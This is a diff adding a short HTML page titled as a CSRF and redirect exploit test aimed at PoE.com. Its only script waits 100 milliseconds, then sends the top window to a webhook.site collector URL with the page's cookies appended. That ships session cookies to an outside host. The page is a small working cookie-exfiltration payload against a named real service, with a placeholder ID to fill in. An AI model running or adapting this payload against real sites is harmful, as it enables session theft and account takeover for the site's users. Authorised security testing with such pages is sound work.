@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>PoE CSRF Exploit Test</title>
+</head>
+<body>
+  <h2>Redirect Exploit Test for PoE.com</h2>
+  
+  <script>
+setTimeout(() => {
+try {
+window.top.location = "https://webhook.site/YOUR-ID?cookie=" + document.cookie;
+} catch (e) {
+alert("Blocked by browser: " + e);
+}
+}, 100);
+</script>
+</body>
+</html>
